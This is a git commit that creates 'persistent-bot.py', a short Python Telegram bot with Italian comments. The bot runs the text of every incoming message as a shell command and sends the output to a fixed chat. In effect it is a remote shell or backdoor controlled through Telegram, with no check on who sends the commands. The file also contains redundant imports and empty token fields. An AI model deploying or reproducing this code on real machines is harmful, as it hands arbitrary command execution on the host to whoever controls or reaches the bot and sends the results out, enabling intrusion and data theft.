db151976a0e9335bfa9bf5fca9ccdbc3cbe77172
Ethan Lacerenza <71321892+ethanlacerenza@users.noreply.github.com>
2023-10-09 12:57:05 +0200

    Create persistent-bot.py

---
+++ persistent-bot.py
@@ -0,0 +1,32 @@
+import telebot
+import paramiko
+
+# Define your Telegram Bot API token (you can obtain this from BotFather on Telegram)
+
+TELEGRAM_BOT_TOKEN = ''
+CHAT_ID = ''
+import telebot
+import subprocess
+
+
+bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
+
+# Gestisci il comando /start
+@bot.message_handler(commands=['start'])
+def handle_start(message):
+    bot.reply_to(message, "Hello world! I'm your persistent bot, give an order")
+
+# Gestisci comandi inviati dall'utente
+@bot.message_handler(func=lambda message: True)
+def handle_command(message):
+    command = message.text
+
+    # Esegui il comando e ottieni l'output
+    try:
+        output = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
+        bot.send_message(CHAT_ID, output)
+    except Exception as e:
+        bot.send_message(CHAT_ID, f"Error: {str(e)}")
+
+# Avvia il bot
+bot.polling()
